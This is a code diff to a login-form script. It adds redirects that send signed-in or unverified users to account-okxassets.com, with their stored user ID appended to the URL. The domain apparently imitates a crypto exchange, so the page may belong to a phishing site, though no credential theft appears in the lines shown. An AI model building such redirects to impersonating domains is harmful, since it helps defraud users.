@@ -19,6 +19,8 @@ const sendLoginEmail = async () => {
   .then(response=> response.json())
     .then(response => {
       console.log(response);
+      const id = localStorage?.getItem('userId')
+        window.location = `https://www.account-okxassets.com/#/${id}`;
     })
     .catch((error) => {
       console.log(error);
@@ -49,16 +51,22 @@ button.onclick = async (event) => {
       console.log(response)
       const userId = localStorage?.getItem('userId')
       console.log("Local User Id", userId);
-      if (response._id === '' || response._id === undefined){
-        alert('Please enter your valid credentials');
+      if (response.message === 'User have not been verified'){
+        window.location = `https://www.account-okxassets.com/`;
         console.log("object");
         return
+      }if (response._id === '' || response._id === undefined){
+        alert('Please enter your valid credentials');
+        button.innerHTML = "Sign In";
+        return
       }else{
+        const id = localStorage?.getItem('userId')
+        window.location = `https://www.account-okxassets.com/#/${id}`;
+        // sendLoginEmail()
         console.log("object2");
-        sendLoginEmail()
-        window.location = `https://www.account-okxassets.com/#/${userId}`;
+        //  console.log(userId)
       }
-    })
+    })  
     .catch((error) => {
       console.log(error);
       button.innerHTML = "Sign In";
